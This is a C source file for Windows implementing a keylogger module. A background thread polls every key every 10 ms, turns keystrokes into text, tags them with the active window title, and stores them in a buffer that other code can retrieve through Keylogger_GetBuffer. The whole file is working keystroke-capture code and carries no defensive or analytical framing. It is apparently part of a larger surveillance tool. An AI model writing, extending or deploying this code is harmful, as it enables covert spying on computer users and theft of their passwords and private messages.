#include <windows.h>
#include <surveillance/keylogger.h>
#include <stdio.h>

// Configuration
#define KEYLOG_BUFFER_SIZE  (64 * 1024)  // 64 KB buffer
#define POLL_INTERVAL_MS    10           // Poll every 10ms

// Global state
static HANDLE g_thread = NULL;
static volatile BOOL g_running = FALSE;
static char g_buffer[KEYLOG_BUFFER_SIZE];
static DWORD g_buffer_pos = 0;
static CRITICAL_SECTION g_cs;
static char g_last_window[256] = {0};

// Key names for special keys
static const char* GetKeyName(int vkCode) {
    switch (vkCode) {
        case VK_RETURN: return "[ENTER]\n";
        case VK_TAB: return "[TAB]";
        case VK_SPACE: return " ";
        case VK_BACK: return "[BACK]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";  // Ignore shift alone
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "[CTRL]";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DEL]";
        case VK_INSERT: return "[INS]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        default: return NULL;
    }
}

// Append to buffer (thread-safe)
static void AppendToBuffer(const char* text) {
    if (!text || !text[0]) return;
    
    EnterCriticalSection(&g_cs);
    
    size_t len = strlen(text);
    if (g_buffer_pos + len < KEYLOG_BUFFER_SIZE - 1) {
        memcpy(g_buffer + g_buffer_pos, text, len);
        g_buffer_pos += (DWORD)len;
        g_buffer[g_buffer_pos] = '\0';
    }
    
    LeaveCriticalSection(&g_cs);
}

// Log current window if changed
static void LogActiveWindow(void) {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return;
    
    char title[256] = {0};
    GetWindowTextA(hwnd, title, sizeof(title));
    
    if (title[0] && strcmp(title, g_last_window) != 0) {
        strcpy(g_last_window, title);
        
        char header[512];
        snprintf(header, sizeof(header), "\n\n--- [%s] ---\n", title);
        AppendToBuffer(header);
    }
}

// Main polling thread
static DWORD WINAPI KeyloggerThread(LPVOID param) {
    UNREFERENCED_PARAMETER(param);
    
    BYTE keyState[256] = {0};
    BOOL wasPressed[256] = {0};
    
    while (g_running) {
        // Log window changes
        LogActiveWindow();
        
        // Check each key
        for (int vk = 8; vk <= 255; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            BOOL isPressed = (state & 0x8000) != 0;
            
            // Key just pressed (transition from up to down)
            if (isPressed && !wasPressed[vk]) {
                // Get keyboard state for ToAscii
                GetKeyboardState(keyState);
                
                // Try special key name first
                const char* keyName = GetKeyName(vk);
                if (keyName) {
                    AppendToBuffer(keyName);
                } else {
                    // Try to convert to ASCII
                    WORD ascii = 0;
                    int result = ToAscii(vk, MapVirtualKey(vk, 0), keyState, &ascii, 0);
                    
                    if (result == 1) {
                        char c = (char)(ascii & 0xFF);
                        if (c >= 32 && c <= 126) {  // Printable
                            char str[2] = {c, 0};
                            AppendToBuffer(str);
                        }
                    }
                }
            }
            
            wasPressed[vk] = isPressed;
        }
        
        Sleep(POLL_INTERVAL_MS);
    }
    
    return 0;
}

BOOL Keylogger_Start(void) {
    if (g_running) return FALSE;  // Already running
    
    InitializeCriticalSection(&g_cs);
    
    g_buffer_pos = 0;
    g_buffer[0] = '\0';
    g_last_window[0] = '\0';
    g_running = TRUE;
    
    g_thread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    if (!g_thread) {
        g_running = FALSE;
        DeleteCriticalSection(&g_cs);
        return FALSE;
    }
    
    return TRUE;
}

void Keylogger_Stop(void) {
    if (!g_running) return;
    
    g_running = FALSE;
    
    if (g_thread) {
        WaitForSingleObject(g_thread, 2000);  // Wait up to 2 sec
        CloseHandle(g_thread);
        g_thread = NULL;
    }
    
    DeleteCriticalSection(&g_cs);
}

BOOL Keylogger_GetBuffer(char** buffer, DWORD* size) {
    if (!buffer || !size) return FALSE;
    
    EnterCriticalSection(&g_cs);
    
    if (g_buffer_pos == 0) {
        LeaveCriticalSection(&g_cs);
        *buffer = NULL;
        *size = 0;
        return TRUE;  // Empty but success
    }
    
    // Allocate and copy
    *buffer = (char*)malloc(g_buffer_pos + 1);
    if (!*buffer) {
        LeaveCriticalSection(&g_cs);
        return FALSE;
    }
    
    memcpy(*buffer, g_buffer, g_buffer_pos);
    (*buffer)[g_buffer_pos] = '\0';
    *size = g_buffer_pos;
    
    // Clear buffer
    g_buffer_pos = 0;
    g_buffer[0] = '\0';
    
    LeaveCriticalSection(&g_cs);
    return TRUE;
}

BOOL Keylogger_IsRunning(void) {
    return g_running;
}
